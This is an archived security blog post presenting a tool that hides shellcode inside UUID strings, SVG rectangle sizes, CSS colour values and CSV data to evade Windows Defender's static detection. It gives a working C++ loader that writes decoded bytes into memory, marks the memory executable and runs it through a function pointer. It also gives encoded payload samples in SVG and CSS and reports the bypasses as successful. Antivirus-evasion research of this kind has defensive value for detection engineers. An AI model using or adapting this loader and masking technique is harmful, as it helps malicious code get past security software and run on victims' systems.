@@ -1,0 +1,146 @@
+# https://pre.empt.blog/post/bluffy/
+
+<!DOCTYPE html><html lang="en" class="dark">
+  <body>
+    <div id="root"><div class="min-h-screen flex flex-col"><main class="flex-1"><div class="mx-auto w-full max-w-full" style="padding: 1.5rem;"><div style="max-width: 1200px; margin: 0px auto;"><h2>Introduction</h2>
+<p><a href="https://twitter.com/michaeljranaldo">Michael Ranaldo</a> proposed an idea:</p>
+<blockquote>
+<p>How will static detection fare against shellcode hidden within realistic datatypes?</p>
+</blockquote>
+<p>Avoiding all kinds of encryption and compression, two <a href="https://docs.microsoft.com/en-us/windows/win32/apiindex/windows-api-list">Windows APIs</a> came to mind: <a href="https://docs.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-uuidfromstringa">UuidFromStringA</a> and <a href="https://docs.microsoft.com/en-us/windows/win32/api/combaseapi/nf-combaseapi-clsidfromstring">CLSIDFromString</a>.</p>
+<p>This function has already seen weaponisation, namely <a href="https://github.com/boku7/Ninja_UUID_Runner">boku7/Ninja_UUID_Runner</a> from <a href="https://twitter.com/0xBoku">0xBoku</a> which does just that. So, we spent some time thinking of methods we could use to do this, and we came up with a tool: <a href="https://github.com/ad-995/bluffy">Bluffy</a>.</p>
+<p>Bluffy takes in a bin file, and has the ability to wrap that bin file up into, currently, four different masks:</p>
+<ul>
+<li>SVG</li>
+<li>CSS</li>
+<li>UUID</li>
+<li>CSV</li>
+</ul>
+<p>These are not uniform, they will require different setup. Lets get into a rundown of the examples and their ability to handle Windows Defender.</p>
+<p>The one missing from this list that we wanted to include is CLSID. That is because we thought we would leave that one as a task for the reader if they felted so compelled. We also had plans for Json, but never got around to it. And then the final type which we couldn't think of a solution for, but there must be!, was JavaScript.</p>
+<p>These are not uniform, they will require different setup, but we have tried to standardise it as much as we can. So, as of now, UUID is the only one which will call <code>VirtualAlloc</code> and <code>VirtualProtect</code> (so read, conversion writes, and then update the page); the rest will simply return a <code>unsigned char</code>. Otherwise, it's pretty straight forward to add. In future, including some more randomisation to add in some more noise would be good, but as a minimal proof of concept, it works for now.</p>
+<p>Before going into some examples of three of these masks vs. Defender, two disclaimers:</p>
+<ul>
+<li>This was only looked at from a static perspective. If Defender catches this on execution, we don't care...</li>
+<li>In a typical Defender-fashion, every other execution passed the dynamic detection.</li>
+</ul>
+<p>Lets get into a rundown of the examples and their ability to handle Windows Defender.</p>
+<h2>UUID</h2>
+<p>First up, <code>UUID</code>. This is by far the easiest one to use. Here is the API declaration:</p>
+<pre><code class="language-cpp">RPC_STATUS <span class="pl-en">UuidFromStringA</span>(
+    RPC_CSTR StringUuid,
+    UUID     *Uuid
+);
+</code></pre>
+<p>This function takes in a string and returns a pointer to the now converted UUID. What makes this so useful is the second parameter: <code>UUID *Uuid</code>. This parameter will automatically write the data to memory, so all that it needs are allocation and execution. Here is the function to allocate and write:</p>
+<pre><code class="language-cpp">LPVOID <span class="pl-en">WriteUuidToMem</span>()
+{
+        <span class="pl-k">int</span> uuid_len = <span class="pl-c1">16</span>;
+        LPVOID pAddress = <span class="pl-c1">VirtualAlloc</span>(<span class="pl-c1">NULL</span>, payloadSz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        <span class="pl-k">if</span> (pAddress == <span class="pl-c1">NULL</span>)
+        {
+                <span class="pl-k">return</span> (LPVOID)<span class="pl-c1">NULL</span>;
+        }
+        DWORD_PTR hptr = (DWORD_PTR)pAddress;
+        DWORD lpflOldProtect = <span class="pl-c1">0</span>;
+
+        <span class="pl-k">int</span> elems = <span class="pl-k">sizeof</span>(payload) / <span class="pl-k">sizeof</span>(payload[<span class="pl-c1">0</span>]);
+        <span class="pl-k">for</span> (<span class="pl-k">int</span> i = <span class="pl-c1">0</span>; i &lt; elems; i++)
+        {
+                RPC_CSTR StringUuid = (RPC_CSTR)payload[i];
+                UUID* Uuid = (UUID*)hptr;
+                RPC_STATUS status = <span class="pl-c1">UuidFromStringA</span>(StringUuid, Uuid);
+                <span class="pl-k">if</span> (status != RPC_S_OK)
+                {
+                        <span class="pl-k">return</span> (LPVOID)<span class="pl-c1">NULL</span>;
+                }
+                hptr += uuid_len;
+        }
+
+        <span class="pl-k">if</span> (<span class="pl-c1">VirtualProtect</span>(pAddress, payloadSz, PAGE_EXECUTE_READ, &amp;lpflOldProtect))
+        {
+                <span class="pl-k">return</span> pAddress;
+        }
+        <span class="pl-k">else</span>
+        {
+                <span class="pl-k">return</span> (LPVOID)pAddress;
+        }
+}
+</code></pre>
+<h2>Execution</h2>
+<p>And then to execute it:</p>
+<pre><code class="language-go">LPVOID pAddress = <span class="pl-c1">WriteUuidToMem</span>();
+<span class="pl-k">int</span> (*<span class="pl-k">go</span>)() = (<span class="pl-k">int</span>(*)())pAddress;
+<span class="pl-k">go</span>();
+</code></pre>
+<p>Again, because only execution is needed at this point, anything can be used to trigger it. Take a look at <a href="https://github.com/S4R1N/AlternativeShellcodeExec">S4R1N/AlternativeShellcodeExec</a> for a comprehensive list.</p>
+<h3>UUID vs. Windows Defender</h3>
+<p>How does it fare against Defender:</p>
+<p><img src="https://pre.empt.blog/static/images/uuid-defender-bypass.PNG" alt="UUID vs. Windows Defender"></p>
+<p>It exceeded its requirement, it bypassed both static detection and execution.</p>
+<h2>SVG</h2>
+<p>For the reader who hasn't used SVG to pop XSS, SVG is the <a href="https://developer.mozilla.org/en-US/docs/Web/SVG">Scalable Vector Graphics</a>. It's got some fanciness for appsec nerds, but what we liked was the XML structure and the plethora of places to drop integers.</p>
+<p>Here is an example SVG from <a href="https://pre.empt.blog/posts/bluffy/">W3Schools</a>:</p>
+<pre><code class="language-xml">&lt;<span class="pl-ent">svg</span> <span class="pl-e">width</span>=<span class="pl-s"><span class="pl-pds">"</span>400<span class="pl-pds">"</span></span> <span class="pl-e">height</span>=<span class="pl-s"><span class="pl-pds">"</span>110<span class="pl-pds">"</span></span>&gt;
+    &lt;<span class="pl-ent">rect</span> <span class="pl-e">width</span>=<span class="pl-s"><span class="pl-pds">"</span>300<span class="pl-pds">"</span></span> <span class="pl-e">height</span>=<span class="pl-s"><span class="pl-pds">"</span>100<span class="pl-pds">"</span></span> <span class="pl-e">style</span>=<span class="pl-s"><span class="pl-pds">"</span>fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)<span class="pl-pds">"</span></span> /&gt;
+    Sorry, your browser does not support inline SVG.  
+&lt;/<span class="pl-ent">svg</span>&gt;
+</code></pre>
+<p>If this was to render, it would be:</p>
+<p>Our solution here was to take all the available integers from <a href="https://developer.mozilla.org/en-US/docs/Web/SVG/Element/rect">rect</a> and split shellcode into them. Here is a snippet:</p>
+<pre><code class="language-swift"><span class="pl-s"><span class="pl-pds">"</span>&lt;?xml version=<span class="pl-cce">\"</span>1.0<span class="pl-cce">\"</span> standalone=<span class="pl-cce">\"</span>no<span class="pl-cce">\"</span>?&gt;<span class="pl-pds">"</span></span>,
+<span class="pl-s"><span class="pl-pds">"</span>&lt;svg xmlns=<span class="pl-cce">\"</span>http://www.w3.org/2000/svg<span class="pl-cce">\"</span> version=<span class="pl-cce">\"</span>1.1<span class="pl-cce">\"</span> width=<span class="pl-cce">\"</span>1250cm<span class="pl-cce">\"</span> height=<span class="pl-cce">\"</span>1250cm<span class="pl-cce">\"</span>&gt;<span class="pl-pds">"</span></span>,
+<span class="pl-s"><span class="pl-pds">"</span>&lt;desc&gt;9W43OV00W8JKMA1IJNEYAM1WTG9AZH8K10LC&lt;/desc&gt;<span class="pl-pds">"</span></span>,
+<span class="pl-s"><span class="pl-pds">"</span>&lt;g id=<span class="pl-cce">\"</span>HMLW03D1BYIQ<span class="pl-cce">\"</span> fill=<span class="pl-cce">\"</span>red<span class="pl-cce">\"</span>&gt;<span class="pl-pds">"</span></span>,
+<span class="pl-s"><span class="pl-pds">"</span>&lt;rect x=<span class="pl-cce">\"</span>252cm<span class="pl-cce">\"</span> y=<span class="pl-cce">\"</span>252cm<span class="pl-cce">\"</span> width=<span class="pl-cce">\"</span>252cm<span class="pl-cce">\"</span> height=<span class="pl-cce">\"</span>252cm<span class="pl-cce">\"</span>/&gt;<span class="pl-pds">"</span></span>,
+<span class="pl-s"><span class="pl-pds">"</span>&lt;rect x=<span class="pl-cce">\"</span>72cm<span class="pl-cce">\"</span> y=<span class="pl-cce">\"</span>72cm<span class="pl-cce">\"</span> width=<span class="pl-cce">\"</span>72cm<span class="pl-cce">\"</span> height=<span class="pl-cce">\"</span>72cm<span class="pl-cce">\"</span>/&gt;<span class="pl-pds">"</span></span>,
+<span class="pl-s"><span class="pl-pds">"</span>&lt;rect x=<span class="pl-cce">\"</span>131cm<span class="pl-cce">\"</span> y=<span class="pl-cce">\"</span>131cm<span class="pl-cce">\"</span> width=<span class="pl-cce">\"</span>131cm<span class="pl-cce">\"</span> height=<span class="pl-cce">\"</span>131cm<span class="pl-cce">\"</span>/&gt;<span class="pl-pds">"</span></span>,
+<span class="pl-s"><span class="pl-pds">"</span>&lt;rect x=<span class="pl-cce">\"</span>228cm<span class="pl-cce">\"</span> y=<span class="pl-cce">\"</span>228cm<span class="pl-cce">\"</span> width=<span class="pl-cce">\"</span>228cm<span class="pl-cce">\"</span> height=<span class="pl-cce">\"</span>228cm<span class="pl-cce">\"</span>/&gt;<span class="pl-pds">"</span></span>,
+<span class="pl-s"><span class="pl-pds">"</span>&lt;rect x=<span class="pl-cce">\"</span>240cm<span class="pl-cce">\"</span> y=<span class="pl-cce">\"</span>240cm<span class="pl-cce">\"</span> width=<span class="pl-cce">\"</span>240cm<span class="pl-cce">\"</span> height=<span class="pl-cce">\"</span>240cm<span class="pl-cce">\"</span>/&gt;<span class="pl-pds">"</span></span>,
+<span class="pl-s"><span class="pl-pds">"</span>&lt;rect x=<span class="pl-cce">\"</span>232cm<span class="pl-cce">\"</span> y=<span class="pl-cce">\"</span>232cm<span class="pl-cce">\"</span> width=<span class="pl-cce">\"</span>232cm<span class="pl-cce">\"</span> height=<span class="pl-cce">\"</span>232cm<span class="pl-cce">\"</span>/&gt;<span class="pl-pds">"</span></span>,
+<span class="pl-s"><span class="pl-pds">"</span>&lt;rect x=<span class="pl-cce">\"</span>192cm<span class="pl-cce">\"</span> y=<span class="pl-cce">\"</span>192cm<span class="pl-cce">\"</span> width=<span class="pl-cce">\"</span>192cm<span class="pl-cce">\"</span> height=<span class="pl-cce">\"</span>192cm<span class="pl-cce">\"</span>/&gt;<span class="pl-pds">"</span></span>,
+<span class="pl-s"><span class="pl-pds">"</span>&lt;rect x=<span class="pl-cce">\"</span>0cm<span class="pl-cce">\"</span> y=<span class="pl-cce">\"</span>0cm<span class="pl-cce">\"</span> width=<span class="pl-cce">\"</span>0cm<span class="pl-cce">\"</span> height=<span class="pl-cce">\"</span>0cm<span class="pl-cce">\"</span>/&gt;<span class="pl-pds">"</span></span>,
+<span class="pl-s"><span class="pl-pds">"</span>&lt;rect x=<span class="pl-cce">\"</span>0cm<span class="pl-cce">\"</span> y=<span class="pl-cce">\"</span>0cm<span class="pl-cce">\"</span> width=<span class="pl-cce">\"</span>0cm<span class="pl-cce">\"</span> height=<span class="pl-cce">\"</span>0cm<span class="pl-cce">\"</span>/&gt;<span class="pl-pds">"</span></span>,
+<span class="pl-s"><span class="pl-pds">"</span>&lt;rect x=<span class="pl-cce">\"</span>0cm<span class="pl-cce">\"</span> y=<span class="pl-cce">\"</span>0cm<span class="pl-cce">\"</span> width=<span class="pl-cce">\"</span>0cm<span class="pl-cce">\"</span> height=<span class="pl-cce">\"</span>0cm<span class="pl-cce">\"</span>/&gt;<span class="pl-pds">"</span></span>,
+<span class="pl-s"><span class="pl-pds">"</span>&lt;rect x=<span class="pl-cce">\"</span>65cm<span class="pl-cce">\"</span> y=<span class="pl-cce">\"</span>65cm<span class="pl-cce">\"</span> width=<span class="pl-cce">\"</span>65cm<span class="pl-cce">\"</span> height=<span class="pl-cce">\"</span>65cm<span class="pl-cce">\"</span>/&gt;<span class="pl-pds">"</span></span>,
+<span class="pl-s"><span class="pl-pds">"</span>&lt;rect x=<span class="pl-cce">\"</span>81cm<span class="pl-cce">\"</span> y=<span class="pl-cce">\"</span>81cm<span class="pl-cce">\"</span> width=<span class="pl-cce">\"</span>81cm<span class="pl-cce">\"</span> height=<span class="pl-cce">\"</span>81cm<span class="pl-cce">\"</span>/&gt;<span class="pl-pds">"</span></span>,
+<span class="pl-s"><span class="pl-pds">"</span>&lt;rect x=<span class="pl-cce">\"</span>65cm<span class="pl-cce">\"</span> y=<span class="pl-cce">\"</span>65cm<span class="pl-cce">\"</span> width=<span class="pl-cce">\"</span>65cm<span class="pl-cce">\"</span> height=<span class="pl-cce">\"</span>65cm<span class="pl-cce">\"</span>/&gt;<span class="pl-pds">"</span></span>,
+<span class="pl-s"><span class="pl-pds">"</span>&lt;rect x=<span class="pl-cce">\"</span>80cm<span class="pl-cce">\"</span> y=<span class="pl-cce">\"</span>80cm<span class="pl-cce">\"</span> width=<span class="pl-cce">\"</span>80cm<span class="pl-cce">\"</span> height=<span class="pl-cce">\"</span>80cm<span class="pl-cce">\"</span>/&gt;<span class="pl-pds">"</span></span>,
+<span class="pl-s"><span class="pl-pds">"</span>&lt;rect x=<span class="pl-cce">\"</span>82cm<span class="pl-cce">\"</span> y=<span class="pl-cce">\"</span>82cm<span class="pl-cce">\"</span> width=<span class="pl-cce">\"</span>82cm<span class="pl-cce">\"</span> height=<span class="pl-cce">\"</span>82cm<span class="pl-cce">\"</span>/&gt;<span class="pl-pds">"</span></span>,
+<span class="pl-s"><span class="pl-pds">"</span>&lt;rect x=<span class="pl-cce">\"</span>81cm<span class="pl-cce">\"</span> y=<span class="pl-cce">\"</span>81cm<span class="pl-cce">\"</span> width=<span class="pl-cce">\"</span>81cm<span class="pl-cce">\"</span> height=<span class="pl-cce">\"</span>81cm<span class="pl-cce">\"</span>/&gt;<span class="pl-pds">"</span></span>,
+<span class="pl-s"><span class="pl-pds">"</span>&lt;/g&gt;<span class="pl-pds">"</span></span>
+</code></pre>
+<p>To achieve this, regex was required. <a href="https://regex101.com/r/8Czgd8/1">This</a> regex was what we went for, with a substitution on double quotes and "cm". In order to even do regex, we had to go down a bit of a rabbit hole. After a lot of Googling, we eventually landed on <a href="https://www.pcre.org/current/doc/html/">pcre2</a>. This was new to us and eventually hacked something together based on <a href="https://github.com/luvit/pcre2/blob/master/src/pcre2demo.c">luvit/pcre2</a>.</p>
+<h3>SVG vs. Windows Defender</h3>
+<p>Testing via Windows Defender:</p>
+<p><img src="https://pre.empt.blog/static/images/svg-defender-bypass.PNG" alt="SVG vs. Windows Defender"></p>
+<p>Another one down.</p>
+<h2>CSS</h2>
+<p>The next one we thought obvious was CSS, it allows for a whole bunch of different places to store CSS. The following example shows the shellcode embedded into the RGB values of a border:</p>
+<pre><code class="language-css">border: 2px 2px solid rgb(144, 244, 39);
+border: 2px 2px solid rgb(144, 201, 2);
+border: 2px 2px solid rgb(144, 51, 158);
+border: 2px 2px solid rgb(144, 41, 179);
+border: 2px 2px solid rgb(144, 154, 59);
+border: 2px 2px solid rgb(144, 139, 238);
+border: 2px 2px solid rgb(144, 114, 132);
+border: 2px 2px solid rgb(144, 159, 89);
+border: 2px 2px solid rgb(144, 254, 210);
+border: 2px 2px solid rgb(77, 12, 76);
+border: 2px 2px solid rgb(90, 157, 178);
+border: 2px 2px solid rgb(65, 154, 217);
+border: 2px 2px solid rgb(82, 121, 178);
+border: 2px 2px solid rgb(85, 124, 144);
+border: 2px 2px solid rgb(72, 205, 191)
+</code></pre>
+<p>Using similar methods to SVG, it can be regexed out.</p>
+<h3>CSS vs. Windows Defender</h3>
+<p>Running this against Defender:</p>
+<p><img src="https://pre.empt.blog/static/images/css-defender-bypass.PNG" alt="CSS vs. Windows Defender"></p>
+<p>Another one worked.</p>
+<h2>Conclusion</h2>
+<p>Out of these 3 techniques, they all bypassed Defender (statically) consistently. We had mixed responses against runtime detection, but that was not the focus of what we were looking for. We found that this method, naturally, has a much lower entropy value too. In hindsight, it's kind of obvious that this type of masking would cause static detection to break because it's literally just integer values in various datatype formats. This idea started as a meme and ended as a bypass (kinda) without going F U L L S T E G A N O G R A P H Y.</p>
+<p>The code is available on <a href="https://github.com/ad-995/bluffy">GitHub</a>.</p></div></div></main></div></div>
+  
+
+</body></html>
